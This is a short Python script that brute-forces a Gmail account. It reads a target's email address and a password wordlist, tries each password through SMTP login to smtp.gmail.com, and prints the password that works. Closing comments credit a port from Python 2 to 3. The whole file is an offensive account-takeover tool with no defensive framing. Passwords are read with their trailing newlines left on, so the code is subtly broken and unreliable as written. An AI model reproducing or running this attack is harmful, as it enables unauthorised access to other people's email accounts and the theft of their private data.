import smtplib
 
smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()
 
user = input("Enter the target's email address: ")
passwfile = input("Enter the password file name: ")
passwfile = open(passwfile, "r")
 
for password in passwfile:
    try:
        smtpserver.login(user, password)
 
        print("[+] Password Found: " + password)
        break;
    except smtplib.SMTPAuthenticationError:
        print("[!] Password Incorrect: " +password)


#attemtion this works on python2 not on 3
# ^ Now ported to py3 by 0vn
